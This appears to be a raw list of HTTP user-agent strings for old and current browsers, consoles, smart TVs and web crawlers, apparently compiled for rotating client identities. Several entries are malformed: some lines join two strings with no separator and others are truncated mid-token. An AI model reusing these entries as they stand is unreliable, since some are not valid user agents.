Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0
Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1
Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4
Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201
Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911
Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)
Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7
Mozilla/5.0 (PLAYSTATION 3; 3.55)
Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2
wii libnup/1.0
Mozilla/4.0 (PSP (PlayStation Portable); 2.00)
PSP (PlayStation Portable); 2.00
Bunjalloo/0.7.6(Nintendo DS;U;en)
Doris/1.15 [en] (Symbian)
BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1
BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100
Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16
Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01
Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)
Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)
Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0
Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3
Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)
Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)
Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)
Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko
Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)
Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)
Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)
Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0; http://www.beslist.nl/
Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)
Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )
Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)
Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)
Mozilla/2.0 (compatible; Ask Jeeves/Teoma)
Mozilla/4.0 (compatible: FDSE robot)
findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)
findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)
Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable
Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable
Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2
Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2
Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2
AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)
AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)
AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)
AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)
AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)
AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)
AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)
AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)
AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)
AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)
Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)
MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)
Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)
Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)
Mozilla/5.0 (compatible; mxbot/1.0; http://www.chainn.com/mxbot.html)
Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)
Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET 
Opera/9.20 (Windows NT 6.0; U; en)
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)
Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)
Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16
Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)
Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)
Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)
Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0
Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7
Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0
Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01
Mozilla/5.0 (SmartHub; SMART-TV; U; Linux/SmartTV) AppleWebKit/531.2+ (KHTML, like Gecko) WebBrowser/1.0 SmartTV Safari/531.2+
Mozilla/5.0 (SMART-TV; X11; Linux i686) AppleWebKit/535.20+ (KHTML, like Gecko) Version/5.0 Safari/535.20+
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36
Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00
Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)
Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3
Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6
Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11
Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02
Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)
Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1
Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5
Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)
Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4
Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1
Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.10
Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.5.24 Version/10.52
Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36
Opera/8.5 (X11; i686 Linux; U; ru, en_US)
Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13918/19.752; U; ru) Presto/2.6.25
Opera/9.80 (Windows NT 6.0; U; ru) Presto/2.5.22 Version/10.50
Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.24 Version/10.53 MM3-WebAssistant
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:7.0.1) Gecko/20100101 Firefox/7.0.1
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0
Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:24.0) Gecko/20100101 Firefox/24.0
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)
Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8
Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716 Thunderbird/1.0.6
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7pre) Gecko/20100925 Firefox/4.0b7pre
Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.3a1pre) Gecko/20100128 Minefield/3.7a1pre
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a9pre) Gecko/2007100205 Minefield/3.0a9pre
Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9a4pre) Gecko/20070402 Minefield/3.0a4pre
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041103 Firefox/1.0RC2
Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0
Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13
Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.27 Safari/536.11
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.3
Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile
Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E234 Safari/601.1
Mozilla/5.0 (Linux; Android 5.1; XT1032 Build/LPB23.13-58) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60
Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/536.8+ (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3
Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25
Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)
Mozilla/5.0 (Admin Catalog; Windows NT 5.1; infobot.4942@yahoo.com)
Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620
Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)
Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22
Mozilla/5.0 (PLAYSTATION 3 4.66) AppleWebKit/531.22.8 (KHTML, like Gecko)
